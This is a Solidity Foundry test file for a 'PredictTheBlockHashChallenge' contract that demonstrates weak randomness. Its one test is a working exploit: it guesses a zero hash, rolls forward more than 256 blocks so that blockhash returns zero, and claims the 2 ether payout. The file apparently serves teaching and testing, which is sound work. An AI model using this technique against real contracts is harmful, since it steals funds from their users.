
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber >= 1);
        vm.assume(blockNumber <= type(uint256).max - 257);

        // --- 2. State Configuration ---
        vm.deal(address(this), 10 ether);
        
        // Set initial block number
        vm.roll(blockNumber);

        // --- 3. Exploit the blockhash limitation ---
        // The blockhash function only returns valid hashes for the 256 most recent blocks.
        // For blocks older than 256 blocks, blockhash returns bytes32(0).
        // We can exploit this by:
        // 1. Locking in a guess of bytes32(0)
        // 2. Waiting for more than 256 blocks
        // 3. Calling settle - the blockhash will return 0, matching our guess

        // Lock in a guess of bytes32(0)
        bytes32 predictedHash = bytes32(0);
        _contractUnderTest.lockInGuess{value: 1 ether}(predictedHash);
        
        // The guess is locked for block.number + 1
        uint256 guessBlock = blockNumber + 1;
        
        // Roll forward more than 256 blocks so blockhash returns 0
        // We need to be at a block where: current_block > guessBlock
        // AND: current_block - guessBlock > 256 (so blockhash returns 0)
        vm.roll(guessBlock + 257);
        
        // Verify that blockhash for the guess block now returns 0
        bytes32 actualBlockhash = blockhash(guessBlock);
        assertEq(actualBlockhash, bytes32(0), "Blockhash should be 0 for blocks older than 256");
        
        // Record balance before settle
        uint256 balanceBefore = address(this).balance;
        
        // Call settle - should succeed because our guess of 0 matches the blockhash of 0
        _contractUnderTest.settle();
        
        // Verify we received the 2 ether payout
        uint256 balanceAfter = address(this).balance;
        assertEq(balanceAfter - balanceBefore, 2 ether, "Should receive 2 ether payout");
        
        // Assert that the randomness was predictable
        assertEq(predictedHash, actualBlockhash, "Randomness should be predictable - blockhash returns 0 for old blocks");
    }

    // Required to receive ether from the contract
    receive() external payable {}
}
